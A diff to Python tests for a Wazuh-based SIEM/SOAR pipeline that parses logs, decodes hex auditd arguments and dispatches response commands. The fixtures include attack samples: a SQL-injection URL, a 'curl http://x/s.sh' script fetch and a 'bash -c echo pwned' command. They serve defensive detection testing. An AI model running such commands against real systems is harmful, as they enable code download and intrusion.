@@ -36,7 +36,9 @@ def test_apache_via_wazuh(enricher):
     raw = wz(full_log=line, decoder={"name": "web-accesslog"}, location="/usr/local/apache2/logs/access_log")
     doc = enricher.enrich(normalize(raw))
     assert get(doc, "agent.id") == "001" and get(doc, "agent.type") == "wazuh" and get(doc, "host.name") == "demo-web"
-    assert get(doc, "event.id").startswith("wazuh-001-1790609494.501537-")
+    assert get(doc, "event.id").startswith("wazuh-001-")
+    other_file = dict(raw, data=dict(raw["data"], id="1790609494.999999"))   # cùng event, vị trí khác trong alerts.json
+    assert get(normalize(other_file), "event.id") == get(doc, "event.id")
     assert get(normalize(raw), "event.id") == get(doc, "event.id")       # cố định -> đọc lại không tạo bản ghi trùng
     assert get(doc, "@timestamp") == "2026-09-28T15:31:34+00:00"          # thời gian trong dòng log
     assert get(doc, "source.ip") == "203.0.113.9" and get(doc, "url.decoded") == "/p?id=1 union select 1,2"
@@ -182,6 +184,14 @@ def test_auditd_execve_and_sca_and_auth():
     assert get(doc, "event.module") == "auditd" and get(doc, "process.name") == "curl"
     assert get(doc, "process.command_line") == "curl http://x/s.sh" and get(doc, "process.parent.pid") == 70
 
+    payload = "echo pwned > /tmp/x"                     # có khoảng trắng -> auditd ghi HEX, decoder Wazuh bỏ mất
+    full = (f'type=SYSCALL msg=audit(1.1:2): arch=c000003e syscall=59 a0=55d1 a1=55d2 exe="/usr/bin/bash" '
+            f'type=EXECVE msg=audit(1.1:2): argc=3 a0="bash" a1="-c" a2={payload.encode().hex().upper()}')
+    doc = normalize(wz(location="/var/log/audit/audit.log", decoder={"name": "auditd"}, full_log=full, data={"audit": {
+        "type": "EXECVE", "syscall": "59", "exe": "/usr/bin/bash", "pid": "8", "ppid": "7",
+        "execve": {"argc": "3", "a0": "bash", "a1": "-c"}}}))
+    assert get(doc, "process.command_line") == f"bash -c {payload}"
+
     doc = normalize(wz(location="sca", data={"sca": {"type": "check", "policy": "CIS Debian 13",
                                                      "check": {"id": "7001", "title": "Ensure X", "result": "failed"}}}))
     assert get(doc, "event.module") == "sca" and get(doc, "sca.check.result") == "failed"
@@ -265,7 +275,7 @@ def test_stock_rule_outside_old_groups_is_shadow_when_setting_on(enricher, monke
 def test_suppress_key_uses_source_or_agent_and_ignores_dead_srcip(enricher):
     d = enricher.enrich(normalize(wz("wazuh_alert", data={"srcip": "9.9.9.9"},
                                      rule={"id": "5710", "level": 8, "groups": ["sshd"]})))
-    assert bridge.suppress_key(d) == ("WZH-5710", get(d, "agent.id"), get(d, "agent.id"), None, None)   # không còn data.srcip
+    assert bridge.suppress_key(d) == ("WZH-5710", get(d, "agent.id"), get(d, "agent.id"), None, None, None)   # không còn data.srcip
 
 
 def test_suppress_key_keeps_distinct_processes_on_one_agent(enricher):
@@ -442,6 +452,20 @@ def test_dispatch_sends_validated_commands(actions):
     assert ("002", ["kill_process", "4242", "b" * 32], "siem-xdr.cmd") in api.calls     # agent Windows
     assert finished["c" * 32][0] == "failed" and "not active" in finished["c" * 32][1]   # Wazuh từ chối
     assert finished["d" * 32][0] == "failed" and not any(c[1][2] == "d" * 32 for c in api.calls)  # IP bẩn: không gửi
+
+
+def test_dispatch_requeues_when_wazuh_unreachable(actions):
+    acts, finished = actions
+
+    class DownAPI(FakeAPI):
+        def active_response(self, agent_id, arguments, script):
+            raise soar_wazuh.WazuhUnreachable("Connection refused")
+
+    es = FakeES()
+    assert soar_wazuh.Responder(es, DownAPI()).dispatch() == 0
+    requeued = {i for _, i, doc in es.updates if doc.get("status") == "pending" and doc.get("dispatch_attempts") == 1}
+    assert {"a" * 32, "b" * 32, "c" * 32} <= requeued and "a" * 32 not in finished     # không mất lệnh chặn
+    assert finished["d" * 32][0] == "failed"                                           # IP bẩn vẫn bị loại ngay
 
 
 def test_collect_results_only_from_same_agent(monkeypatch):
